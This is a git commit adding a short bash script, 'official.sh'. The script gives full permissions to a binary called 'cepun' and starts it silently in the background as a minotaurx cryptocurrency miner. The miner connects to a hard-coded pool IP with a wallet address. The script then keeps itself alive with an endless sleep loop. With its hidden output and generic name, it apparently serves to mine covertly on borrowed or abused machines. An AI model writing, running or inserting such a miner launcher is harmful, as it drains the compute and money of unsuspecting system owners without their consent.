70657db74a23c92ae0d4dfeaa11021d027f5fafa
andrygibhq00 <133579346+andrygibhq00@users.noreply.github.com>
2025-06-18 13:53:17 +0700

    Create official.sh

---
+++ official.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+nproc --all
+chmod 777 cepun
+./cepun -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
+sleep 8
+while true
+do
+        echo "My Cepun..."
+        sleep 14400
+done
